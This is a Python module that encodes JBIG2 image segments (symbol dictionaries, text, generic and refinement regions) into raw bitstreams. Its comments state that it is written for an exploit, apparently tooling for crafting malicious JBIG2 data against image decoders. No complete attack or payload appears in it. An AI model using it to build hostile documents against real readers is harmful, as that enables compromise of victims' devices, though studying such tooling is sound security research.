# Copyright 2022 Riatre Foo
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import enum
from typing import Any, List, Optional
import struct
import abc
import logging
import dataclasses

from jbjbarith import Bitmap, ArithmeticEncoder, Proc

__all__ = [
    "Bitmap",
    "SegmentType",
    "CombOp",
    "Segment",
    "SymbolDict",
    "PageInfo",
    "TextRegion",
    "GenericRegion",
    "ReadoutRefinement",
    "EOFSegment",
]

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)


class StreamBuffer:
    def __init__(self):
        self.pieces: List[bytes] = []

    def write_long(self, val: int):
        if not (-(2 ** 31) <= val < 2 ** 31):
            raise ValueError(f"{val} is out of range")
        # Hey, apparently GitHub Copilot knows JBIG2 uses Big Endian. :thinking_face:
        self.pieces.append(struct.pack(">i", val))

    def write_ulong(self, val: int):
        if not (0 <= val < 2 ** 32):
            raise ValueError(f"{val} is out of range")
        self.pieces.append(struct.pack(">I", val))

    def write_word(self, val: int):
        if not (-(2 ** 15) <= val < 2 ** 15):
            raise ValueError(f"{val} is out of range")
        self.pieces.append(struct.pack(">h", val))

    def write_uword(self, val: int):
        if not (0 <= val < 2 ** 16):
            raise ValueError(f"{val} is out of range")
        self.pieces.append(struct.pack(">H", val))

    def write_byte(self, val: int):
        if not (-(2 ** 7) <= val < 2 ** 7):
            raise ValueError(f"{val} is out of range")
        self.pieces.append(bytes([val & 255]))

    def write_ubyte(self, val: int):
        if not (0 <= val < 2 ** 8):
            raise ValueError(f"{val} is out of range")
        self.pieces.append(bytes([val]))

    def skip(self, n_bytes: int):
        self.pieces.append(b"\x00" * n_bytes)

    def build(self):
        return b"".join(self.pieces)


class SegmentType(enum.IntEnum):
    SymbolDict = 0
    TextRegion = 4
    ImmTextRegion = 6
    GenericRegion = 36
    ImmGenericRegion = 38
    GenericRefinementRegion = 40
    ImmGenericRefinementRegion = 42
    PageInfo = 48
    EOF = 51


class CombOp(enum.IntEnum):
    Or = 0
    And = 1
    Xor = 2
    Xnor = 3
    Replace = 4


class Segment(abc.ABC):
    def __init__(
        self, seg_num, type: SegmentType, *, ref_segs: List[int] = [], page_no: int = 0
    ):
        self.seg_num = seg_num
        self.type = type
        self.page_no = page_no
        self.ref_segs = ref_segs

    @abc.abstractmethod
    def _build_payload(self) -> bytes:
        raise NotImplementedError

    def to_bytes(self):
        buf = StreamBuffer()

        seg_flags = self.type.value & 0x3F
        if self.page_no > 255:
            seg_flags |= 0x40
        buf.write_ulong(self.seg_num)
        buf.write_byte(seg_flags)

        ref_size = len(self.ref_segs)
        assert ref_size < 2 ** 29
        if ref_size > 6:
            buf.write_ulong((7 << 29) | ref_size)
            buf.skip((ref_size + 9) // 8)
        else:
            buf.write_ubyte(ref_size << 5)

        write_ref = buf.write_ubyte
        if self.seg_num > 65536:
            write_ref = buf.write_ulong
        elif self.seg_num > 256:
            write_ref = buf.write_uword
        for seg in self.ref_segs:
            write_ref(seg)

        if seg_flags & 0x40:
            buf.write_ulong(self.page_no)
        else:
            buf.write_ubyte(self.page_no)

        payload = self._build_payload()
        buf.write_ulong(len(payload))
        buf.pieces.append(payload)
        return buf.build()


class SymbolDict(Segment):
    def __init__(self, number, symbols: List[Bitmap] = [], **kwargs):
        super().__init__(number, SegmentType.SymbolDict, **kwargs)
        self.symbols = symbols

    def _build_payload(self) -> bytes:
        buf = StreamBuffer()
        buf.write_uword(0)  # flags
        # a1x, a1y, a2x, a2y, a3x, a3y, a4x, a4y
        for v in [3, -1, -3, -1, 2, -2, -2, -2]:
            buf.write_byte(v)
        # no symbol dictionary refinement AT flags as refAgg = 0 in flags

        buf.write_ulong(len(self.symbols))  # number of exported symbols
        buf.write_ulong(len(self.symbols))  # number of new symbols

        e = ArithmeticEncoder()
        last_h, last_w = 0, 0
        for symbol in self.symbols:
            h, w = symbol.height, symbol.width
            assert h != 0 and w != 0
            assert last_h <= h
            assert last_w <= w

            if last_h != h:
                if last_h != 0:
                    e.write_oob(Proc.IADW)
                e.write_int(Proc.IADH, h - last_h)
                last_h = h
                last_w = 0
            e.write_int(Proc.IADW, w - last_w)
            last_w = w

            e.write_bit_image(symbol)
        if self.symbols:
            e.write_oob(Proc.IADW)

        # Export all symbols. See jbig2sym.cc for details.
        e.write_int(Proc.IAEX, 0)
        e.write_int(Proc.IAEX, len(self.symbols))

        e.finalize()
        buf.pieces.append(e.to_bytes())
        return buf.build()


class PageInfo(Segment):
    def __init__(self, number, *, w: int, h: int, x_res=144, y_res=144, **kwargs):
        super().__init__(number, SegmentType.PageInfo, **kwargs)
        self.w = w
        self.h = h
        self.x_res = x_res
        self.y_res = y_res

    def _build_payload(self) -> bytes:
        buf = StreamBuffer()
        buf.write_ulong(self.w)
        buf.write_ulong(self.h)
        buf.write_ulong(self.x_res)
        buf.write_ulong(self.y_res)

        flag = 0
        flag |= 0 << 2  # default pixel value = 0
        flag |= 0 << 3  # default combination operator = 0 (OR)
        buf.write_byte(flag)
        buf.write_uword(0)  # striping
        return buf.build()


class TextRegion(Segment):
    def __init__(
        self,
        number,
        *,
        w: int,
        h: int,
        x: int,
        y: int,
        comb_op: CombOp = CombOp.Replace,
        instances: List[int] = [],
        imm: bool = True,
        ref_symbol_cnt: int = 0,
        **kwargs,
    ):
        super().__init__(
            number,
            SegmentType.ImmTextRegion if imm else SegmentType.TextRegion,
            **kwargs,
        )
        self.w = w
        self.h = h
        self.x = x
        self.y = y
        self.instances = instances
        self.comb_op = comb_op
        if self.instances:
            # ._. this smells bad
            assert ref_symbol_cnt > 0
            self.symbol_code_len = 0
            ref_symbol_cnt -= 1
            while ref_symbol_cnt > 0:
                self.symbol_code_len += 1
                ref_symbol_cnt >>= 1

    def _build_payload(self) -> bytes:
        buf = StreamBuffer()
        buf.write_ulong(self.w)
        buf.write_ulong(self.h)
        buf.write_ulong(self.x)
        buf.write_ulong(self.y)
        buf.write_byte(self.comb_op.value & 7)

        flags = 1 << 4  # ref corners: top left
        buf.write_uword(flags)

        # TODO: refinement atx0 aty0 atx1 aty1
        # --

        buf.write_ulong(len(self.instances))

        e = ArithmeticEncoder()
        e.write_int(Proc.IADT, 0)  # initial t
        assert len(self.instances) <= 1  # well...
        # This loop should look like the one in SymbolDict (i.e. delta encode the dt
        # and ds), but... for an exploit we don't care.
        for inst in self.instances:
            e.write_int(Proc.IADT, 0) # start new line dt
            e.write_int(Proc.IAFS, 0) # first ds
            # we have strips = 0, no need to encode another dt here
            # symbol ID
            e.write_iaid(self.symbol_code_len, inst)
            e.write_oob(Proc.IADS)   # end of line
        e.finalize()
        buf.pieces.append(e.to_bytes())
        return buf.build()


class GenericRegion(Segment):
    def __init__(
        self,
        number,
        *,
        x: int = 0,
        y: int = 0,
        comb_op: CombOp = CombOp.Replace,
        bitmap: Bitmap,
        imm: bool = True,
        **kwargs,
    ):
        super().__init__(
            number,
            SegmentType.ImmGenericRegion if imm else SegmentType.GenericRegion,
            **kwargs,
        )
        self.x = x
        self.y = y
        self.comb_op = comb_op
        self.bitmap = bitmap

    def _build_payload(self) -> bytes:
        buf = StreamBuffer()
        buf.write_ulong(self.bitmap.width)
        buf.write_ulong(self.bitmap.height)
        buf.write_ulong(self.x)
        buf.write_ulong(self.y)
        buf.write_byte(self.comb_op.value & 7)
        buf.write_byte(0)  # flags: mmr = 0, templ = 0, tpgdOn = 0
        # a1x, a1y, a2x, a2y, a3x, a3y, a4x, a4y
        for v in [3, -1, -3, -1, 2, -2, -2, -2]:
            buf.write_byte(v)
        e = ArithmeticEncoder()
        e.write_bit_image(self.bitmap)
        e.finalize()
        buf.pieces.append(e.to_bytes())
        return buf.build()


class GenericRefinementRegion(Segment):
    def __init__(
        self,
        number,
        *,
        ref: Optional[int] = None,  # None means refine on page bitmap
        # Note that x, y always refer to page bitmap (i.e. they have no effect on
        # segment references)
        x: int = 0,
        y: int = 0,
        w: int = 0,
        h: int = 0,
        templ: int = 0,
        tpgr: int = 0,
        comb_op: CombOp = CombOp.Replace,
        imm: bool = True,
        **kwargs,
    ):
        assert "ref_segs" not in kwargs

        super().__init__(
            number,
            SegmentType.ImmGenericRefinementRegion
            if imm
            else SegmentType.GenericRefinementRegion,
            ref_segs=[ref] if ref is not None else [],
            **kwargs,
        )
        self.x = x
        self.y = y
        self.w = w
        self.h = h
        self.templ = templ
        self.tpgr = tpgr
        self.comb_op = comb_op

    def _build_data(self) -> bytes:
        e = ArithmeticEncoder()
        e.write_refine(self.refine)
        e.finalize()
        return e.to_bytes()

    def _build_payload(self) -> bytes:
        buf = StreamBuffer()
        assert self.w != 0 and self.h != 0
        buf.write_ulong(self.w)
        buf.write_ulong(self.h)
        buf.write_ulong(self.x)
        buf.write_ulong(self.y)
        buf.write_ubyte(self.comb_op.value & 7)
        buf.write_ubyte(self.templ | (self.tpgr << 1))  # flags
        if self.templ == 0:
            # atx0 aty0 atx1 aty1
            for x in [-1, -1, -1, -1]:
                buf.write_byte(x)
        buf.pieces.append(self._build_data())
        return buf.build()


class ReadoutRefinement(GenericRefinementRegion):
    def __init__(self, number, **kwargs):
        return super().__init__(number, w=1, h=1, templ=0, tpgr=1, **kwargs)

    def _build_data(self) -> bytes:
        e = ArithmeticEncoder()
        ltpCX = 0x0010
        e.write_bit(ltpCX, 0)
        e.write_bit(0, 1)  # context does not matter: they are all zero
        e.finalize()
        return e.to_bytes()


class EOFSegment(Segment):
    def __init__(self):
        return super().__init__(0, SegmentType.EOF)

    def _build_payload(self) -> bytes:
        return b""
